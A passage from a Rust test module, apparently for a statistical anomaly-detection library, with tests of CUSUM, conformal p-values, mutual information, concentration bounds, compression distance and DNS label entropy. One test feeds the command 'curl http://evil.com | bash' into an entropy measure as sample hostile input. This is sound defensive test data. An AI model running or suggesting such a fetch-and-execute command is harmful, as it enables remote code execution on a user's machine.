                detected = true;
                break;
            }
        }
        assert!(detected, "CUSUM should detect mean shift");
    }

    #[test]
    fn cusum_arl0_positive() {
        let detector = CusumDetector::new(0.0, 0.5, 5.0);
        let arl = detector.estimated_arl0();
        assert!(arl > 100.0, "ARL₀ should be large: {arl}");
    }

    #[test]
    fn spectral_radius_star_graph() {
        // Star graph with center 0 connected to 1,2,3
        let adj = vec![
            vec![0.0, 1.0, 1.0, 1.0],
            vec![1.0, 0.0, 0.0, 0.0],
            vec![1.0, 0.0, 0.0, 0.0],
            vec![1.0, 0.0, 0.0, 0.0],
        ];
        let rho = spectral_radius(&adj);
        // Star with n leaves has ρ = √n
        assert!(
            (rho - 3.0_f64.sqrt()).abs() < 0.1,
            "ρ = {rho}, expected √3 ≈ 1.73"
        );
    }

    #[test]
    fn conformal_calibrator_coverage() {
        // Calibration scores from normal behavior
        let scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
        let cal = ConformalCalibrator::new(scores, 0.05);
        assert!(cal.threshold > 0.9, "threshold = {}", cal.threshold);
        assert!((cal.coverage_guarantee() - 0.95).abs() < 1e-10);
    }

    #[test]
    fn conformal_p_value_extreme() {
        let scores: Vec<f64> = (0..100).map(|i| i as f64).collect();
        let cal = ConformalCalibrator::new(scores, 0.05);
        let p = cal.p_value(200.0); // way above all calibration scores
        assert!(p < 0.05, "extreme score should have low p-value: {p}");
    }

    #[test]
    fn mutual_information_less_dependent() {
        // Identical series should have maximum MI (= H(X))
        let x: Vec<u32> = (0..200).map(|i| i % 5).collect();
        let mi_ident = mutual_information(&x, &x);
        // Different distribution: collapse categories → less joint structure
        let y: Vec<u32> = (0..200).map(|i| (i % 5) / 2).collect(); // 0,0,1,1,2,0,0,1,1,2,...
        let mi_partial = mutual_information(&x, &y);
        // MI(X;f(X)) ≤ H(f(X)) ≤ H(X) = MI(X;X)
        assert!(
            mi_partial < mi_ident + 1e-10,
            "MI(X;f(X))={mi_partial} should be ≤ MI(X;X)={mi_ident}"
        );
        assert!(
            mi_partial > 0.0,
            "deterministic function should have positive MI"
        );
    }

    #[test]
    fn mutual_information_identical() {
        let x: Vec<u32> = (0..100).map(|i| i % 5).collect();
        let mi = mutual_information(&x, &x);
        // For identical series, MI = H(X)
        assert!(mi > 1.0, "identical MI should be high: {mi}");
    }

    #[test]
    fn hoeffding_threshold_increases_with_confidence() {
        let t1 = hoeffding_threshold(100, 1.0, 0.05);
        let t2 = hoeffding_threshold(100, 1.0, 0.01);
        assert!(t2 > t1, "stricter δ should give larger threshold");
    }

    #[test]
    fn sanov_threshold_decreases_with_n() {
        let t1 = sanov_threshold(100, 8, 1e-6);
        let t2 = sanov_threshold(1000, 8, 1e-6);
        assert!(t2 < t1, "more data should give tighter threshold");
    }

    #[test]
    fn bernstein_tighter_than_hoeffding() {
        // When variance is small, Bernstein should give a tighter bound
        let n = 500;
        let delta = 0.01;
        let h = hoeffding_threshold(n, 1.0, delta);
        let b = bernstein_threshold(n, 0.01, 1.0, delta); // very small variance
        assert!(
            b < h,
            "Bernstein should be tighter with small variance: b={b}, h={h}"
        );
    }

    #[test]
    fn sanov_threshold_requires_k() {
        assert!(sanov_threshold(100, 0, 1e-6).is_infinite());
    }

    #[test]
    fn ncd_identical_is_zero() {
        let data = b"hello world".to_vec();
        let ncd = normalized_compression_distance(&data, &data);
        assert!(
            ncd < 0.3,
            "NCD of identical strings should be near 0: {ncd}"
        );
    }

    #[test]
    fn ncd_different_is_high() {
        let x: Vec<u8> = (0..200).map(|i| (i * 97) as u8).collect();
        let y: Vec<u8> = (0..200).map(|i| (i * 31 + 100) as u8).collect();
        let ncd = normalized_compression_distance(&x, &y);
        assert!(ncd > 0.3, "NCD of different data should be higher: {ncd}");
    }

    #[test]
    fn cmdline_information_matches_entropy_functions() {
        let data = b"curl http://evil.com | bash";
        let metrics = cmdline_information(data, 4).unwrap();
        let entropy = char_entropy(data);
        assert!((metrics.shannon_entropy_bits - entropy).abs() < 1e-10);
        assert!(metrics.renyi_h2_bits >= 0.0);
        assert!(metrics.min_entropy_bits >= 0.0);
        let normalized = metrics.normalized();
        assert!((0.0..=1.0).contains(&normalized.renyi_h2));
        assert!((0.0..=1.0).contains(&normalized.compression_ratio));
        assert!((0.0..=1.0).contains(&normalized.min_entropy));
        assert!((0.0..=1.0).contains(&normalized.entropy_gap));
    }

    #[test]
    fn dns_entropy_detects_random_labels() {
        let randomish = "x7f3a2b9d2c7f.example";
        let normal = "updates.example";
        let e_rand = dns_entropy(randomish);
        let e_norm = dns_entropy(normal);
        assert!(e_rand > e_norm, "random label should have higher entropy");
    }

    proptest! {
        #[test]
        fn entropy_is_scale_invariant(values in proptest::collection::vec(0.0f64..10.0, 1..64), scale in 0.1f64..10.0) {
            let scaled: Vec<f64> = values.iter().map(|v| v * scale).collect();
            let h1 = shannon_entropy(&values);
            let h2 = shannon_entropy(&scaled);
            prop_assert!((h1 - h2).abs() < 1e-8);
        }

        #[test]
        fn wasserstein_is_scale_invariant(values in proptest::collection::vec(0.0f64..10.0, 2..64), scale in 0.1f64..10.0) {
            let mut other = values.clone();
            other.rotate_left(1);
            let scaled: Vec<f64> = values.iter().map(|v| v * scale).collect();
            let scaled_other: Vec<f64> = other.iter().map(|v| v * scale).collect();
            let w1 = wasserstein_1(&values, &other);
            let w2 = wasserstein_1(&scaled, &scaled_other);
            prop_assert!((w1 - w2).abs() < 1e-8);
        }

        #[test]
        fn cmdline_information_is_deterministic(data in proptest::collection::vec(any::<u8>(), 20..128)) {
            let a = cmdline_information(&data, 20).unwrap();
            let b = cmdline_information(&data, 20).unwrap();
            prop_assert!((a.shannon_entropy_bits - b.shannon_entropy_bits).abs() < 1e-12);
            prop_assert!((a.renyi_h2_bits - b.renyi_h2_bits).abs() < 1e-12);
            prop_assert!((a.min_entropy_bits - b.min_entropy_bits).abs() < 1e-12);
            prop_assert!((a.entropy_gap_bits - b.entropy_gap_bits).abs() < 1e-12);
            prop_assert!((a.compression_ratio - b.compression_ratio).abs() < 1e-12);
        }
    }
}
